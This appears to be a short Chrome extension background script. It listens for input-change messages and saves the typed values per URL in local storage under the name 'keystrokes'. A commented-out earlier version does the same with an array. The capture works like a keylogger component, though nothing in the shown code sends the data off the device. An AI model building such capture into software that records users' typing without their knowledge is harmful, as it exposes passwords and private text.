// export {}

console.log(
  "Live now; make now always the most precious time. Now will never come again."
)

// chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
//   if (message.action === "inputChanged") {
//     chrome.storage.local.get({ keystrokes: [] }, (result) => {
//       const keystrokes = result.keystrokes
//       keystrokes.push({
//         key: message.value,
//         url: message.url
//       })
//       chrome.storage.local.set({ keystrokes })
//     })
//   }
// })

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.action === "inputChanged") {
    chrome.storage.local.get({ keystrokes: {} }, (result) => {
      let keystrokes = result.keystrokes

      keystrokes[message.url] = message.value
      console.log("Keystrokes", keystrokes)
      // Save the updated keystrokes array
      chrome.storage.local.set({ keystrokes })
    })
  }
})
